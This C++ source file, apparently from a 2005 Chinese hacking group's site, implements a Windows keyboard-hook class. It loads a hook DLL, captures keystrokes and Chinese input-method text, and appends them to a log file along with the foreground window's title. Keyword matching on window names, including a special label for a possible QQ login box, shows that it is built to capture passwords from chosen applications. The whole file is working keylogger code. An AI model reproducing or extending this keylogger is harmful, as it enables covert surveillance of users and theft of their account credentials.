/*===========================================================================
FileName:KeyBoardHook.cpp
Usage:KeyBoard Hook Class V1.2
发布： 火狐技术联盟[F.S.T] 2005/10/08
网站:http://www.wrsky.com
版权：原作者所有
=============================================================================*/
#include "stdafx.h"
#include "KeyBoardHook.h"
#include "imm.h"
#pragma comment(lib,"imm32.lib") 
//----------------------------------------------------------------------------
#define UPWORD 1       //大写状态标记
#define LOWWORD 0      //小写状态标记
#define ShiftDown 1    //Shift键按下标记
#define ShiftUp 0      //Shift键弹起标记
#define WM_KEYHOOK       WM_USER+100 //键盘消息
#define WM_MSHOOK        WM_USER+101 //鼠标消息
#define WM_KEYHOOK_CN    WM_USER+102 //支持中文
#define WM_KEYHOOK_CN_EN WM_USER+103 //中英
#define MAX_CN_STRING_LEN 128
#define KBHOOKTYPE_EN    1           //纯原始钩子类型
#define KBHOOKTYPE_CN    2           //中文钩子
#define KBHOOKTYPE_CN_EN 3           //中英结合钩子
HINSTANCE dll_lib;
//-----------------------------------------------------------------------------
char KeyName[][20]={   //不可显示键的键名列表，总共34个
"Tab","CapsLock","Enter","Shift","Ctrl","Alt","Backspace","Ins","Home","End","Pause","Break","PgUp","PgDn","Delete","NumLock","Left","Right","Down","Up","Left Windows","Esc","F1","F2","F3","F4","F5","F6","F7","F8","F9","F10","F11","F12"
};
char PutKeyName[][20]={ //不可显示键的输出键名列表，总共34个
"Tab","CL","Enter","Sf","Cl","At","B-p","Is","Home","End","Ps","Bk","PU","PD","Del","NumL","Lt","Rt","Dn","Up","LtWin","Esc","F1","F2","F3","F4","F5","F6","F7","F8","F9","F10","F11","F12"
};
char    KeyOn[]={"~!@#$%^&*()_+{}|:\"<>?"};//具有上下对应字符键的对应数组表
char KeyUnder[]={"`1234567890-=[]\\;',./"};
//
char kl_filename[10][20]=
{
    "english.ime",
    "unispim.ime",
    "freewb.ime",
    "wingb.ime",
    "winpy.ime",
    "winzm.ime",
    "pintlgnt.ime",
    "winabc.ime",
    "winsp.ime",
    "surime.ime"
};
//
char kl_name[10][11]={//对应输入法名字
"<英文输入>",
"<紫光拼音>",
"<极点五笔>",
"<内码输入>",
"<全拼输入>",
"<郑码输入>",
"<微软拼音>",
"<智能ABC>",
"<双拼输入>",
"<增强内码>"
};

UINT HookKeyBoardThread(LPVOID info){
KeyBoardHook *PKBHook;
int threadid;
MSG msg;
threadid=GetCurrentThreadId();
HANDLE hThreadid=CreateFileMapping((HANDLE)0xffffffff,NULL,PAGE_READWRITE,0,sizeof(int),"Threadid");
HANDLE hCNString=CreateFileMapping((HANDLE)0xffffffff,NULL,PAGE_READWRITE,0,MAX_CN_STRING_LEN,"CNString");
if(hThreadid){
  int *pThreadid=(int *)MapViewOfFile(hThreadid,FILE_MAP_READ|FILE_MAP_WRITE,0,0,0);
  if(pThreadid) *pThreadid=threadid;
  }
else AfxMessageBox("create mem failed");
TRACE("%d",threadid);
PKBHook=(KeyBoardHook *)info;
if(!PKBHook->HookKeyBoard(threadid)){
  TRACE("hook keyboard failed!\r\n");
  return 0;
  }
else TRACE("hook keyboard ok!\r\n");
while(true){
     if(PeekMessage(&msg,NULL,WM_KEYHOOK,WM_KEYHOOK,PM_REMOVE)){
	    PKBHook->HookDeail(msg);
		TRACE("i get it 1");
		}
     if(PeekMessage(&msg,NULL,WM_KEYHOOK_CN,WM_KEYHOOK_CN,PM_REMOVE)&&PKBHook->KBHookType==KBHOOKTYPE_CN){
	    PKBHook->HookDeailCn(msg);
		TRACE("i get it 2\n");
		}
     if(PeekMessage(&msg,NULL,WM_KEYHOOK_CN_EN,WM_KEYHOOK_CN_EN,PM_REMOVE)&&PKBHook->KBHookType==KBHOOKTYPE_CN_EN){
	    PKBHook->HookDeailCnEn(msg);
		TRACE("i get it 3\n");
		}
	 Sleep(1);
     }
return 1;
}
//
KeyBoardHook::KeyBoardHook()
{
KBHookType=KBHOOKTYPE_EN;
canlog=1;
index=1;
CNString[2]='\0';
}
//
KeyBoardHook::~KeyBoardHook()
{
RemoveLibrary();
}

//function 4:
int KeyBoardHook::InitLibrary(void){
  if(dll_lib==NULL) dll_lib=LoadLibrary(this->KBINFO.Dll_path);//加载HOOK连接库
  if(dll_lib==NULL){
   TRACE("load library failed!\r\n");
   return 0;
   }
  else{
   TRACE("load library ok!\r\n");
   return 1;
   }
}
//
void KeyBoardHook::RemoveLibrary(void){
  if(dll_lib) FreeLibrary(dll_lib);
}
//function 7:
int KeyBoardHook::SetKeyBoardHook(void){
if(dll_lib!=NULL){
   FARPROC SetKBHook;  //SetHook函数申明
   if(KBHookType==KBHOOKTYPE_EN||KBHookType==KBHOOKTYPE_CN_EN){
     SetKBHook=GetProcAddress(dll_lib,"SetKBHook");//获得函数地址
     if(SetKBHook!=NULL){
       TRACE("get SetKBHook ok\r\n");
	   SetKBHook();//找到地址，设置HOOK
	   }
     else {TRACE("get SetKBHook failed\r\n");return 0;}
     SetKBHook=NULL;
     }
   if(KBHookType==KBHOOKTYPE_CN||KBHookType==KBHOOKTYPE_CN_EN){
     SetKBHook=GetProcAddress(dll_lib,"SetKBHookCn");
     if(SetKBHook!=NULL){
       TRACE("get SetKBHookCn ok\r\n");
	   SetKBHook();//找到地址，设置HOOK
	   }
     else {TRACE("get SetKBHook failed\r\n");return 0;} 
     }
   }
return 1;
}

//function 8:
int KeyBoardHook::RemoveKeyBoardHook(void){
if(dll_lib!=NULL){
   void (*RemoveKBHook)();  //SetHook函数申明
   (FARPROC &)RemoveKBHook=GetProcAddress(dll_lib,"RemoveKBHook");//获得函数地址
   if(RemoveKBHook){
	   RemoveKBHook();//找到地址，设置HOOK
	   return 1;
	   }
   }
return 0;
}

//function 9:
int KeyBoardHook::SaveStrLog(char *str){
fstream keylog;
keylog.open(this->KBINFO.Savepath,ios::out|ios::app);//打开指定文件
if(keylog.fail()) return 0;
else{
    keylog.put('[');
    keylog.write(str,strlen(str)); //保存字符串
    keylog.put(']');
    }
keylog.close();
return 1;
}
//
void KeyBoardHook::HookDeail(MSG Msg){//原始键盘钩子
     char str[20]={0};
     int i;
     if(GetAsyncKeyState((int)Msg.wParam)>0) return;//如果没有键被按下 ，返回
     if(GetAsyncKeyState((int)Msg.wParam)<0&&canlog){   //如果有键被按下并且能够记录信息
        if(!SaveWindowName()) return;                     //保存窗口名
        GetKeyNameText(Msg.lParam,str,20);    //获取键的键名
        for(i=0;i<34;i++){    //是否是不可显示键的键名
             if(strcmp(str,KeyName[i])==0){  //是的话，以特定格式保存
               SaveStrLog(KeyName[i]);
               return;
               }
             }
        short key;
        key=MapVirtualKey(Msg.wParam,2);  //获得键的伪码对应的字符值 ，wParam即为伪码
        if(GetKeyState(VK_CAPITAL)&&(GetAsyncKeyState(VK_SHIFT)<0)) SaveKeyLog(key,UPWORD,ShiftDown);//大写，Shift键按下状态保存
        else if(GetKeyState(VK_CAPITAL)&&(GetAsyncKeyState(VK_SHIFT)>=0)) SaveKeyLog(key,UPWORD,ShiftUp); //大写，Shift键弹起状态保存
        else if(GetAsyncKeyState(VK_SHIFT)<0&&(!GetKeyState(VK_CAPITAL))) SaveKeyLog(key,LOWWORD,ShiftDown);//小写，Shift键按下状态保存
        else SaveKeyLog(key,LOWWORD,ShiftUp);//否则，小写，Shift键弹起状态保存
        }
}


//function 10:
int KeyBoardHook::SaveKeyLog(short key,int Word,int ShiftState){
int i=0;
fstream keylog;
keylog.open(this->KBINFO.Savepath,ios::out|ios::app|ios::binary);//打开指定文件
if(keylog.fail()) return 0;
else{
/*============================================================================
说明：26个英文字符键的伪码经过MapVirtualKey()转化后都是大写字符的ASCII值表示，
        故如果是小写状态要将其转化，如果Shift键按下，还要对那些一个键上有两个字
        符的键的字符进行转化
==============================================================================*/
    if((Word==UPWORD)&&(ShiftState==ShiftUp)) keylog.put((char)key);//大写，Shift键弹起状态保存
    else if((Word==LOWWORD)&&(ShiftState==ShiftUp)){//小写，Shift键弹起状态保存
       if(key>64&&key<91) key+=32;//判断是否是英文大写的26个字符，是就转换为小写
       else key=key;    //不是26个字符，不改变
       keylog.put((char)key); //输出信息
       }
    else if((Word==UPWORD)&&(ShiftState==ShiftDown)){//大写，Shift键按下状态保存
       while(KeyUnder[i]){//判断是否字符串尾
            if((char)key==KeyUnder[i]){//上下字符值转化判断
                key=KeyOn[i];
                keylog.put((char)key);
                return 1;
                }
            i++;
            }
       if(key>64&&key<91) key+=32;//判断是否是英文大写的26个字符，是就转换为小写
       else key=key;    //不是26个字符，不改变
       keylog.put((char)key); //输出信息
       }
    else if((Word==LOWWORD)&&(ShiftState==ShiftDown)){//小写，Shift键按下状态保存
       while(KeyUnder[i]){
            if((char)key==KeyUnder[i]){  //上下字符值转化判断
                key=KeyOn[i];
                keylog.put((char)key);
                return 1;
                }
            i++;
            }
       keylog.put((char)key); //输出信息
       }
    else keylog.put((char)key); //上面四种情况已经包含了所有组合，这个可要可不要
    }
keylog.flush();
keylog.close();
return 1;
}

//function 11:
int KeyBoardHook::SaveWindowName(void){
HWND winhdl;     //窗口句柄
winhdl=GetForegroundWindow(); //获得最前端窗口句柄
if(winhdl){
   GetWindowText(winhdl,current_winname,sizeof(current_winname)); //保存窗口名到指定位置
   CString key;
   key.Format("%s",current_winname); 
   if(!KeyIsInWinName(key)) return 0;
   if(strcmp(old_winname,current_winname)!=0){//如果当前窗口名改变
      strcpy(old_winname,current_winname); //改变旧的窗口名为最新窗口名
      fstream keylog;
      keylog.open(this->KBINFO.Savepath,ios::out|ios::app|ios::binary);//创建文件对象并保存窗口名
      if(keylog.fail()) return 0;
      else{
          keylog.put('\r');
          keylog.put('\n');
          keylog.write(current_winname,strlen(current_winname));
          keylog.put('\r');
          keylog.put('\n');
          keylog.close();
		  return 1;
          }
      }
   else return 1;
   }
return 0;
}

//------------------------------------
int KeyBoardHook::StartKeyBoardHook()
{
if(dll_lib!=NULL){
   void (*StartKBHook)();
   (FARPROC &)StartKBHook=GetProcAddress(dll_lib,"StartKBHook");
   if(StartKBHook){
      TRACE("get StartKBHook ok\r\n");
      StartKBHook();
	  return 1;
	  }
   }
return 0;
}

int KeyBoardHook::StopKeyBoardHook()
{
if(dll_lib!=NULL){
   void (*StopKBHook)();
   (FARPROC &)StopKBHook=GetProcAddress(dll_lib,"StopKBHook");
   if(StopKBHook){
      StopKBHook();
	  return 1;
	  }
   }
return 0;
}

int KeyBoardHook::HookKeyBoard(int threadid)
{
if(SetKeyBoardHookThreadId(threadid)){
     if(StartKeyBoardHook()) 
	    if(SetKeyBoardHook()){
		  TRACE("start ok");
		  return 1;
		  }
	 }
return 0;
}

int KeyBoardHook::UnHookKeyBoard()
{
if(RemoveKeyBoardHook()) return 1;
else return 0;
}

int KeyBoardHook::SetKeyBoardHookThreadId(int threadid)
{
if(dll_lib!=NULL){
   void (*SetKBHookThreadId)(int threadid);
   (FARPROC &)SetKBHookThreadId=GetProcAddress(dll_lib,"SetKBHookThreadId");
   if(SetKBHookThreadId){
      TRACE("SetKBHookThreadId ok\r\n");
      SetKBHookThreadId(threadid);
	  return 1;
	  }
   }
return 0;
}

int KeyBoardHook::Start()
{
InitLibrary();
AfxBeginThread(HookKeyBoardThread,(LPVOID)this);
return 1;
}

bool KeyBoardHook::KeyIsInWinName(CString WinName)
{
//return true;
char key[20];
unsigned int i=0,j=0;
bool inkey=false;
ZeroMemory(key,sizeof(key));
WinName.MakeLower();
if(strcmp("*",this->KBINFO.Key)==0) return true;
while(this->KBINFO.Key[i]){
      key[j]=this->KBINFO.Key[i];
	  i++;
	  if(this->KBINFO.Key[i]==','){
	     if(WinName.Find(key,0)>=0){
		    if(strcmp(key,"\n")==0) strcpy(current_winname,"QQ登陆框[可能]");
		    inkey=true;
			break;
			}
         ZeroMemory(key,sizeof(key));
		 j=0;
		 i++;
		 continue;		  
		 }
	  j++;
	  };
if(i==strlen(this->KBINFO.Key)){
   if(WinName.Find(key,0)>=0) inkey=true;
   if(strcmp(key,"\n")==0) strcpy(current_winname,"QQ登陆框[可能]");
   }
return inkey;
}

void KeyBoardHook::StopLog()
{
canlog=0;
}

void KeyBoardHook::StartLog()
{
canlog=1;
}

void KeyBoardHook::SetKBHookType(int type)
{
  KBHookType=type;
}

void KeyBoardHook::HookDeailCn(MSG Msg)//支持输入法的消息钩子
{
//char *pCNString;
char str[20]={0};
int i;
/*
HANDLE hCNString=OpenFileMapping(FILE_MAP_WRITE,false,"CNString");
if(hCNString)
    pCNString=(char *)MapViewOfFile(hCNString,FILE_MAP_READ|FILE_MAP_WRITE,0,0,0);
*/
    if(!SaveWindowName()) return ;                     //保存窗口名
    unsigned char ch=(unsigned char)Msg.wParam;
    ch>>=7;
    if(ch&1){//判断中文字节
       TRACE("chinese byte:0x=%x \n",(unsigned char)Msg.wParam);
       CNString[index]=(unsigned char)Msg.wParam;
       if(index==0){
         TRACE((char *)&CNString);
         SaveCnStrLog((char *)&CNString,2);  //保存中文字符，2字节
         index=1;
         }
       else index=0;
       }
    else{
        TRACE("no chinese byte 0x=%x\n",(unsigned char)Msg.wParam);
        GetKeyNameText(Msg.lParam,str,sizeof(str));//获得控制键名字,可能是非控制键则返回为空
        TRACE(str);
        for(i=0;i<34;i++){    //是否是不可显示键的键名
             if(strcmp(str,KeyName[i])==0){
                SaveStrLog(KeyName[i]);//是的话，以特定格式保存              
                break;
                }
             }
        if(i==34) //非控制键，既可显示的键
          SaveCnStrLog((char *)&(Msg.wParam),1);
        }
}

void KeyBoardHook::HookDeailCnEn(MSG Msg)//支持输入法的消息钩子
{
char *pCNString;
int i;
HANDLE hCNString=OpenFileMapping(FILE_MAP_WRITE,false,"CNString");
if(hCNString){
    pCNString=(char *)MapViewOfFile(hCNString,FILE_MAP_READ|FILE_MAP_WRITE,0,0,0);
    if(!SaveWindowName()) return ;                     //保存窗口名
    SaveCnStrLog(pCNString,strlen(pCNString));
    memset(pCNString,0,128);
    //if (pCNString) UnmapViewOfFile(pCNString);
    //if (hCNString) CloseHandle(hCNString);
    }
}

int KeyBoardHook::SaveCnStrLog(char *str,int size)
{
fstream keylog;
keylog.open(this->KBINFO.Savepath,ios::out|ios::app);//打开指定文件
if(keylog.fail()) return 0;
else{
    keylog.write((char *)str,size); //保存字符串
    }
keylog.close();
return 1;
}

void KeyBoardHook::GetKeyNameTextByValue(char value, char *str, int size)
{

}
